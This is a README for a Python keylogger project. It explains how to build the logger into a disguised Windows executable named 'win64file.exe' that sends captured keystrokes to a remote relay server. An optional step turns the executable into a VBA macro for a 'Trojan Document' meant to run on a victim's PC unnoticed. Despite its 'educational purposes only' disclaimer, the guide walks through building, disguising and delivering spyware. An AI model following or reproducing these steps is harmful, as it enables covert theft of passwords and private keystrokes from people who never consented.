# Aetriks: Simple Python Keylogger

A simple Python keylogger that captures keystrokes on a Windows target PC and sends them to a remote server running on Linux.

> **Disclaimer**:  
> This code is for **educational purposes only**! Do not use it for any illegal activities. Misuse of this tool is your responsibility.

---

## Features

- Captures keystrokes in real-time on a Windows target PC.
- Sends collected keystrokes to a remote server running on Linux.
- Configurable server IP, port, and data transmission interval.

---

## Installation Guide (Linux)

### **Step 1: Clone the Repository**

1. Clone the Aetriks repository:
   ```bash
   git clone https://github.com/frHimanshu/Aetriks.git
   cd Aetriks
   ```

2. Clone the Aetriks Relay Server repository inside the `Aetriks` directory:
   ```bash
   git clone https://github.com/frHimanshu/aetriks-relay.git
   ```

---

### **Step 2: Set Up the Keylogger**

1. Create a virtual environment:
   ```bash
   python3 -m venv keylogger_env
   source keylogger_env/bin/activate
   ```

2. Install required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Edit the `config.json` file in Aetriks-relay directory:
   - Update the `ip_address` field with the IP address of the Linux machine on which the Aetriks Relay server is gonna be hosted.
   - Example:
     ```json
     {
         "ip_address": "",
         "port_number": 8080,
         "time_interval": 10
     }
     ```

4. Convert the keylogger to a Windows executable:
   - Install PyInstaller:
     ```bash
     pip install pyinstaller
     ```
   - Build the executable and include `config.json`:
     ```bash
     pyinstaller --onefile --name win64file --add-data=config.json:. keylogger.py
     ```
   - The output executable (`win64file.exe`) will be located in the `dist` directory.

5. Working executable is successfully created.

### Step 2.1: Format conversion: Executable to Vba. [Optional]

- What is this for? <br>
This step is for creating a Trojan Document. The vba script can be merged in the word Document with extension .docm . After sharing the Document file (macro enabled0 on target pc and ran the file, This can work exactly like exe file but without even noticing. Steps to create vba script is below!

   - Transfer the `win64file.exe` in the folder where `exe_to_vba.py` is sitting.
   - Run the python script of `exe_to_vba.py` you will receive a `output.vba` file.
   - To merge the `.vba` script in the Word file, Their are many youtube videos you can find.
   - The `.docm` file is ready for testing. 

---

### **Step 3: Set Up the Aetriks Relay Server**

Refer to the [Aetriks Relay Server Repository](https://github.com/frHimanshu/aetriks-relay) for detailed installation instructions.

---

## Contact

Contact me on Discord if you want to know more about this or have any doubts! <br>
id: `_himanshu__`

---

## Legal and Ethical Use

This project is for **educational purposes only**.  
**Make sure you have explicit permission** before running this on any device. Misuse of this tool is your responsibility.


## Contribution

Feel free to contribute to this project by submitting issues or pull requests on [GitHub](https://github.com/frHimanshu/Aetriks).

---

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.

---
